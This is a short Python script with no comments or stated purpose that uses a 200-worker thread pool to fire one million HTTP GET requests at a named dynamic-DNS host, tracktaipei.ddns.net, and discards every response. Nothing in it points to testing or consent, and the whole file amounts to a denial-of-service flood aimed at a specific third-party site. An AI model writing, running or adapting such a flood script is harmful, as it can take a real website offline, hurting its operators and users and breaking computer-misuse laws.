import concurrent.futures
import requests

URL = 'http://tracktaipei.ddns.net'

with concurrent.futures.ThreadPoolExecutor(max_workers=200) as excutor:
    futures = [excutor.submit(requests.get, URL) for i in range(1000000)]
    for future in concurrent.futures.as_completed(futures):
        pass
